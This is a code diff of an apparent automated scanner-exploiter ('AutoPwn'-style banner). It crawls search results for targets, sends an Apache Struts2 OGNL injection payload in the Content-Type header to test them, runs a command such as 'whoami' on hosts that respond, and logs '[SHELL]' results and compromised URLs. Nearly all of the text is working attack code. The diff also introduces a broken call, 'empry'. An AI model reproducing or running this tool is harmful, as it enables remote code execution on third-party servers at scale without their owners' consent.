@@ -168,8 +168,7 @@ def crawler():
         api.search(keyword, num=expect_num)
 
 
-def exploit(timeout):
-    cmd = 'whoami'
+def exploit(timeout, cmd):
     payload = "%{(#_='multipart/form-data')."
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
     payload += "(#_memberAccess?"
@@ -191,6 +190,8 @@ def exploit(timeout):
         'user-agent': 'Mozilla/5.0',
         'content-type': payload
     }
+    with lock:
+        print '\033[0;32m[*] exploit starting\033[0m'
     while True:
         url = vuln_queue.get()
         try:
@@ -201,15 +202,15 @@ def exploit(timeout):
                 print '\033[1;31m[!] [EXP_ERROR] %s\033[0m' % url
                 print '\033[1;31m[!] [EXP_ERROR]\033[0m', e
         else:
+            with lock:
+                print '\033[1;32m[*] [SHELL] %s\033[0m' % result
+                print '\033[1;32m[*] [SHELL] %s\033[0m' % url
             with open('./vulnerable.txt', 'a') as vulnerable:
-                vulnerable.write(result+'\n')
-                vulnerable.write(url+'\n\n')
+                vulnerable.write(result+'\t'+url+'\n')
 
 
 def poccheck(timeout):
     global vuln_num
-    with lock:
-        print '\033[0;32m[*] poc starting\033[0m'
     poc = "%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
     poc += "(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))."
     poc += "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('fuck')).(#o.close())}"
@@ -217,6 +218,8 @@ def poccheck(timeout):
         "poc": poc,
         "key": "fuck"
     }
+    with lock:
+        print '\033[0;32m[*] poc starting\033[0m'
     while True:
         url = url_queue.get()
         with lock:
@@ -253,7 +256,7 @@ def banner():
     print " / ___ \ |_| | || (_) |  __/ \ V  V /| | | |"
     print "/_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|"
     print "                                            "
-    print "                              {alpha 1.0.5} "
+    print "                              {alpha 1.1.0} "
     print "                                            "
 
 
@@ -271,6 +274,8 @@ def atexit():
 
 
 def main():
+    timeout = 10
+    cmd = 'whoami'
     banner()
     if proxies:
         print '[*] [PROXY] %s' % proxies['https']
@@ -278,15 +283,15 @@ def main():
     print '[*] starting at', time.strftime("%H:%M:%S")
     print ''
     try:
-        poc_thread = SubThread(poccheck, (10,))
+        poc_thread = SubThread(poccheck, (timeout,))
         poc_thread.daemon = True
         poc_thread.start()
-        exp_thread = SubThread(exploit, (10,))
+        exp_thread = SubThread(exploit, (timeout, cmd))
         exp_thread.daemon = True
         exp_thread.start()
         crawler()
         while True:
-            if vuln_queue.empty():
+            if url_queue.empry() and vuln_queue.empty():
                 sys.exit()
             else:
                 time.sleep(1)
